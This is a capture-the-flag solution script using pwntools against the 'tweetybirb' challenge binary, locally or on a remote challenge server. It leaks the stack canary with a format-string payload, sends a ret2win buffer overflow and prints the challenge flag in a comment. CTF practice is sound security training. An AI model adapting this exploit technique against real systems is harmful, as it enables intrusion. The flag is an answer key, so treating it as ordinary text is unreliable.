import sys
from pwn import *

# Flag : kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}

if sys.argv[1] == "local":
        elf = ELF("./tweetybirb")
        prog = elf.process()
if sys.argv[1] == "remote":
        prog = remote('143.198.184.186', 5002)

print(prog.recvuntil("?"))
print(prog.recvuntil("?"))
padding = b"A"*72
nop_ret_gadget = p64(0x0040114f)
win_addr = p64(0x004011d6)

format_string_payload = b"%15$p"
prog.sendline(format_string_payload)
stack_canary = p64(int(prog.recvuntil("?").decode().split("\n")[1], 0))
print("[+] Stack canary : " + str(stack_canary))

payload = padding + stack_canary + b"AAAAAAAA" + nop_ret_gadget  + win_addr
prog.sendline(payload)
print(prog.recv())

prog.interactive()
